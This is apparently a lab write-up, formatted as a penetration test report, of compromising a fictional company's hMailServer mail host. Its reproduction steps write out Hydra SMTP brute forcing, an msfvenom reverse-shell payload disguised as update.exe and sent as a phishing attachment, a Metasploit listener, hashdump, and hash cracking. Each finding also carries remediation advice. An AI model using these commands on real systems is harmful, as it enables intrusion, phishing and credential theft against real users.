# You Got Mail — Penetration Test Report

## Objective and Scope

The objective of this assessment was to evaluate the security posture of **BRICK-MAIL**, a Windows Server 2019 host operated by the fictional organization Brownbrick, with a focus on mail infrastructure (hMailServer), authentication controls, and resilience to credential-based and social-engineering attacks.

## Scope of Work

**In-Scope Assets:**
- **Target:** 10.112.179.250 (BRICK-MAIL)
- **Domain:** `brownbrick.co`
- **Services:** SMTP/SMTP Submission (25, 587), POP3 (110), IMAP (143), SMB (445), RDP (3389), WinRM (5985)
- **Testing Perspective:** Unauthenticated external attacker with passive reconnaissance permitted against the public website

---

## Enumeration

### Port Scan (Rustscan)

```
Port    Service
25      SMTP (hMailServer)
110     POP3
143     IMAP
445     SMB
587     SMTP
3389    RDP
5985    WinRM
135+    MSRPC
```

Hostname resolved to `BRICK-MAIL`, running hMailServer.

### Tools Used
- Rustscan
- CeWL
- Hydra
- Metasploit / msfvenom
- John the Ripper
- Hashcat

---

## Vulnerabilities

| Vulnerability | Severity | Impact |
|---|---|---|
| Employee Username Enumeration via Public Website | Low | Enables targeted credential and phishing attacks |
| Weak SMTP Account Password / No Brute-Force Protection | High | Unauthorized mailbox access, pivot to internal phishing |
| Lack of Attachment Filtering Enables Internal Phishing | High | Initial access via malicious executable |
| Insufficiently Protected Windows Credential Material (Hash Dump) | High | Lateral movement and credential cracking |
| hMailServer Administrator Credentials Recoverable from Local Storage | High | Full mail server administrative compromise |

---

### Employee Username Enumeration via Public Website

#### Severity
Low

#### CWE
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

#### OWASP Category
OWASP Top 10 2021 – A01: Broken Access Control

#### Description
The organization's public website (`brownbrick.co`) exposes employee names and contact information without restriction. This information was harvested to construct a list of valid email addresses/usernames, which directly enabled the SMTP brute-force and phishing attacks described below.

#### Affected Functionality
- Public corporate website (staff/about pages)

#### Steps to Reproduce
1. Browse the public website and identify staff names listed on team/about pages.
2. Derive corporate email address format and construct candidate usernames (e.g. `<first-initial><lastname>@brownbrick.co`).

#### Proof of Concept
The following valid employee addresses were derived directly from public website content:
```
oaurelius@brownbrick.co
wrohit@brownbrick.co
lhedvig@brownbrick.co
tchikondi@brownbrick.co
pcathrine@brownbrick.co
fstamatis@brownbrick.co
```

#### Impact
- Provides attackers with a high-confidence target list for credential attacks and phishing campaigns
- Reduces the effort required for subsequent brute-force and social engineering stages

#### Root Cause
Full employee names are published on a public-facing website without consideration of how this information could be combined with predictable email naming conventions.

#### Recommendation
- Limit publicly listed staff information to what is operationally necessary
- Avoid predictable email naming conventions, or pair them with strong authentication controls (MFA) that reduce the value of username enumeration
- Provide security awareness training on the risks of public staff directories

#### References
- OWASP Top 10 2021 – A01: Broken Access Control
- CWE-200

---

### Weak SMTP Account Password / No Brute-Force Protection

#### Severity
High

#### CWE
CWE-307: Improper Restriction of Excessive Authentication Attempts

#### OWASP Category
OWASP Top 10 2021 – A07: Identification and Authentication Failures

#### Description
The SMTP service accepted repeated authentication attempts without any observed lockout, rate-limiting, or alerting. Combined with a custom wordlist generated from the organization's public website content, a valid account password was recovered via brute force in a short period.

#### Affected Functionality
- SMTP authentication (port 25/587)

#### Steps to Reproduce
1. Generate a custom wordlist from public website content using CeWL:
   ```bash
   ./cewl.rb https://brownbrick.co --lowercase > custom_password.txt
   ```
2. Brute-force SMTP authentication using the harvested usernames and generated wordlist:
   ```bash
   hydra -L users.txt -P custom_password.txt mail.thm smtp -V -I
   ```
3. Observe successful authentication for a discovered credential pair.

#### Proof of Concept
Brute-forcing returned valid credentials (`lhedvig@brownbrick.co` with a weak, dictionary-derived password) with no account lockout or rate-limiting observed during the attack.

#### Impact
- Unauthorized access to a corporate mailbox
- The compromised account was subsequently used to send a phishing email to internal staff (see next finding), demonstrating a direct path from external brute force to internal compromise

#### Root Cause
Weak password policy combined with absence of account lockout, rate-limiting, or anomaly detection on the SMTP authentication endpoint.

#### Recommendation
- Enforce a strong password policy (minimum length/complexity, dictionary-word rejection) for all mail accounts
- Implement account lockout or progressive rate-limiting on SMTP authentication after repeated failures
- Enable monitoring/alerting for high-volume authentication attempts against mail services
- Require multi-factor authentication for mailbox access where supported

#### References
- OWASP Top 10 2021 – A07: Identification and Authentication Failures
- CWE-307

---

### Lack of Attachment Filtering Enables Internal Phishing

#### Severity
High

#### CWE
CWE-434: Unrestricted Upload of File with Dangerous Type

#### OWASP Category
OWASP Top 10 2021 – A05: Security Misconfiguration

#### Description
Using the mailbox compromised via brute force, an email containing a malicious executable attachment (a Meterpreter payload generated with `msfvenom`) was sent to all enumerated employee addresses. The mail server delivered the message and attachment to recipients without any apparent attachment-type filtering, antivirus scanning, or sandboxing, and the payload was executed by a recipient, granting remote access to their workstation.

#### Affected Functionality
- Outbound/inbound mail attachment handling

#### Steps to Reproduce
1. Generate a Windows Meterpreter reverse-shell payload:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=1337 -f exe > update.exe
   ```
2. Using the credentials obtained via SMTP brute force, send an email with `update.exe` attached to all harvested employee addresses via an authenticated SMTP session.
3. Start a Metasploit listener:
   ```
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST <attacker_ip>
   set LPORT 1337
   run
   ```
4. Wait for a recipient to execute the attachment.

#### Proof of Concept
A Meterpreter session was successfully established after a recipient executed the delivered `update.exe` attachment, confirming both delivery of an unfiltered executable attachment and successful code execution on an internal workstation.

#### Impact
- Initial access to an internal Windows workstation from an external position
- Enables follow-on credential harvesting and lateral movement (see next findings)

#### Root Cause
The mail server does not filter, scan, or block executable attachment types, and end users were not prevented from executing unsigned executables received via email.

#### Recommendation
- Block or strip executable attachment types (`.exe`, `.scr`, `.bat`, etc.) at the mail gateway
- Integrate antivirus/sandbox scanning of all inbound and outbound attachments
- Apply application allow-listing on endpoints to prevent execution of unauthorized binaries
- Provide regular phishing-awareness training to staff

#### References
- OWASP Top 10 2021 – A05: Security Misconfiguration
- CWE-434

---

### Insufficiently Protected Windows Credential Material (Hash Dump)

#### Severity
High

#### CWE
CWE-522: Insufficiently Protected Credentials

#### OWASP Category
OWASP Top 10 2021 – A02: Cryptographic Failures

#### Description
With Meterpreter access to the compromised workstation, local Windows password hashes were dumped using Meterpreter's built-in `hashdump` functionality. One of the extracted NTLM hashes corresponded to a weak, dictionary-crackable password, which was recovered offline using John the Ripper.

#### Affected Functionality
- Local Windows SAM database / credential storage

#### Steps to Reproduce
1. From an active Meterpreter session, run:
   ```
   meterpreter > hashdump
   ```
2. Save the extracted NTLM hash for a target account to a file.
3. Crack the hash offline:
   ```bash
   john <hashfile> --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
   ```

#### Proof of Concept
An NTLM hash extracted via `hashdump` (account `wrohit`) was successfully cracked using John the Ripper against the `rockyou.txt` wordlist, recovering the account's plaintext password.

#### Impact
- Recovery of plaintext credentials for a Windows user account
- Enables lateral movement and use of recovered credentials against other services (RDP, WinRM, SMB)

#### Root Cause
Local account password complexity was insufficient to resist offline dictionary attacks once hashes were obtained, and the host lacked controls (e.g. credential guard, restricted local admin access) to prevent hash extraction following initial compromise.

#### Recommendation
- Enforce strong, non-dictionary password policies across all Windows accounts
- Restrict local administrator privileges to limit the ability to dump credential material post-compromise
- Enable Credential Guard and other LSASS-protection mechanisms where supported
- Monitor for use of credential-dumping techniques (e.g. via EDR)

#### References
- OWASP Top 10 2021 – A02: Cryptographic Failures
- CWE-522

---

### hMailServer Administrator Credentials Recoverable from Local Storage

#### Severity
High

#### CWE
CWE-522: Insufficiently Protected Credentials

#### OWASP Category
OWASP Top 10 2021 – A02: Cryptographic Failures

#### Description
The hMailServer installation directory (`C:\Program Files (x86)\hMailServer\`) was found to contain the administrator account's password hash in a location accessible to a user with local access to the host. The hash was recovered offline using Hashcat, granting full administrative control over the mail server.

#### Affected Functionality
- hMailServer administrator configuration storage

#### Steps to Reproduce
1. From the compromised workstation, browse to `C:\Program Files (x86)\hMailServer\` and locate the configuration file containing the administrator password hash.
2. Extract the hash and crack it offline:
   ```bash
   hashcat <hashfile> /usr/share/wordlists/rockyou.txt
   ```

#### Proof of Concept
The hMailServer administrator password hash was located within the application's local configuration files and successfully cracked using Hashcat, yielding valid administrator credentials for the mail server management console.

#### Impact
- Full administrative control over the organization's mail server, including the ability to read, redirect, or create mailboxes for any user
- Combined with the earlier findings, represents a complete compromise of the organization's email infrastructure

#### Root Cause
Administrative credentials for a critical service are stored locally using a hashing scheme weak enough to be recovered via offline dictionary attack, in a location readable by users with local host access.

#### Recommendation
- Store service administrator credentials using strong, salted, computationally expensive hashing (e.g. bcrypt/argon2) where supported by the application
- Restrict filesystem permissions on application configuration directories to administrative accounts only
- Use unique, high-entropy passwords for service administrator accounts to resist offline cracking even if hashes are exposed
- Periodically audit local applications for credential material stored in accessible locations

#### References
- OWASP Top 10 2021 – A02: Cryptographic Failures
- CWE-522

---

## Attack Chain Summary

1. Harvested employee names from the public corporate website
2. Built a custom wordlist from website content using CeWL
3. Brute-forced SMTP credentials for a valid employee account using Hydra
4. Used the compromised mailbox to send a phishing email with a Meterpreter payload to all employees
5. Gained Meterpreter access after a recipient executed the payload
6. Dumped and cracked local Windows password hashes
7. Located and cracked the hMailServer administrator password hash from local configuration files

## Key Takeaways

- Public staff directories combined with predictable email formats significantly reduce attacker effort for username enumeration
- Lack of brute-force protection on mail authentication allows credential discovery via dictionary attacks
- Unfiltered executable attachments turn a single compromised mailbox into an organization-wide phishing vector
- Post-exploitation credential dumping is highly effective against accounts with weak passwords
- Service administrator credentials stored locally (e.g. hMailServer) must use strong hashing and restricted file permissions